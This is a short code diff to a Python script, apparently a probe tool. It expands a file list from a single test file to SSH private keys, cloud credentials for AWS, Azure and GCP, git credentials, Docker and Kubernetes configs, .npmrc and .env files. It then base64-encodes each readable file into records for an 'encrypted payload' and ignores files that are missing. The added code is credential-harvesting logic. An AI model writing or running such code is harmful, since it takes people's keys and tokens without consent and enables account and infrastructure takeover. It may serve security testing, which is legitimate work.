@@ -33,6 +33,33 @@ except ImportError as exc:  # pragma: no cover - depends on runtime environment
 # Paths whose contents are included in the encrypted payload.
 PATHS = [
     # SSH
+    r"%USERPROFILE%\.ssh\id_rsa",
+    r"%USERPROFILE%\.ssh\id_ed25519",
+    r"%USERPROFILE%\.ssh\id_ecdsa",
+    r"%USERPROFILE%\.ssh\id_dsa",
+    r"%USERPROFILE%\.ssh\config",
+    r"%USERPROFILE%\.ssh\known_hosts",
+    r"%USERPROFILE%\.ssh\authorized_keys",
+    # AWS
+    r"%USERPROFILE%\.aws\credentials",
+    r"%USERPROFILE%\.aws\config",
+    # Azure
+    r"%USERPROFILE%\.azure\accessTokens.json",
+    r"%USERPROFILE%\.azure\azureProfile.json",
+    # GCP
+    r"%APPDATA%\gcloud\credentials.db",
+    r"%APPDATA%\gcloud\application_default_credentials.json",
+    # Git
+    r"%USERPROFILE%\.gitconfig",
+    r"%USERPROFILE%\.git-credentials",
+    # Docker
+    r"%USERPROFILE%\.docker\config.json",
+    # Kubernetes
+    r"%USERPROFILE%\.kube\config",
+    # NPM
+    r"%USERPROFILE%\.npmrc",
+    # Generic env files
+    r"%USERPROFILE%\.env",
     r"%USERPROFILE%\test\testconfig.txt",
 ]
 
@@ -71,13 +98,18 @@ def _build_file_records(jitter_seconds: float) -> list[dict[str, str]]:
     records: list[dict[str, str]] = []
     for path in PATHS:
         expanded = _expand_path(path)
-        with open(expanded, "rb") as handle:
-            data = handle.read()
+        try:
+            with open(expanded, "rb") as handle:
+                data = handle.read()
+            content_b64 = base64.b64encode(data).decode("ascii")
+        except OSError:
+            # Preserve probe behavior even when the path is absent/unreadable.
+            content_b64 = ""
         records.append(
             {
                 "declared_path": path,
                 "expanded_path": expanded,
-                "content_b64": base64.b64encode(data).decode("ascii"),
+                "content_b64": content_b64,
             }
         )
 
